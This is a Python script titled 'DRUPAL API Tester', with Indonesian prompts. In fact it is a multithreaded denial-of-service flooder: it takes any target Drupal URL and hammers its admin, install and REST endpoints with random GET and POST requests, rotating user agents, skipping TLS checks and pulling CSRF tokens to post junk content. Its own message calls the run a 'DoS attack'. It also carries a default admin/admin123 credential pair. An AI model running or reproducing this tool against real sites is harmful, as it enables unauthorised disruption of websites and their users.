import time
import json
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class DrupalAPITester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRF-Token": "null"  # Akan diupdate saat request
        }
        # Endpoint Drupal yang umum digunakan
        self.endpoints = [
            "user/login",
            "node",
            "admin/content",
            "admin/people",
            "admin/modules",
            "admin/config",
            "system/ajax",
            "core/install.php",
            "user/register",
            "user/password",
            "admin/structure",
            "admin/reports",
            "batch",
            "entity/node",
            "entity/user",
            "entity/taxonomy_term",
            "entity/comment",
            "rest/session/token"
        ]
        self.payloads = {
            "auth_test": {
                "name": "admin",
                "pass": "admin123",
                "form_id": "user_login_form"
            },
            "content_test": {
                "title": [{"value": "Test Content"}],
                "type": [{"target_id": "article"}],
                "body": [{"value": "Test body content"}],
                "_links": {"type": {"href": "node/article"}}
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def get_csrf_token(self, url):
        try:
            response = requests.get(
                f"{url.rstrip('/')}/rest/session/token",
                headers=self.headers,
                verify=False,
                timeout=5
            )
            if response.ok:
                return response.text
        except:
            pass
        return None

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        # Update CSRF token jika diperlukan
        if method.upper() == "POST":
            csrf_token = self.get_csrf_token(url)
            if csrf_token:
                self.headers["X-CSRF-Token"] = csrf_token

        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
            else:
                response = requests.post(
                    full_url,
                    json=data,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting DoS attack on {url} for {duration}s with {workers} threads")
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = (
                    self.payloads["content_test"]
                    if method == "POST"
                    else None
                )
                self.send_request(method, url, endpoint, data=payload)
                # Menambahkan jeda kecil untuk menghindari overload
                time.sleep(random.uniform(0.1, 0.3))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    print("""
    ╔════════════════════════════════════════╗
    ║          DRUPAL API Tester             ║
    ║            coded by Danz               ║
    ╚════════════════════════════════════════╝
    """)
    
    target_url = input("Masukan target Drupal URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        workers = int(input("Masukan number of threads (default: 20): ") or 20)
        duration = int(input("Masukan duration in seconds (default: 120): ") or 120)
        
        tester = DrupalAPITester()
        tester.flood(target_url, workers=workers, duration=duration)
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")
    except ValueError:
        print("[ERROR] Please enter valid numbers for threads and duration.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
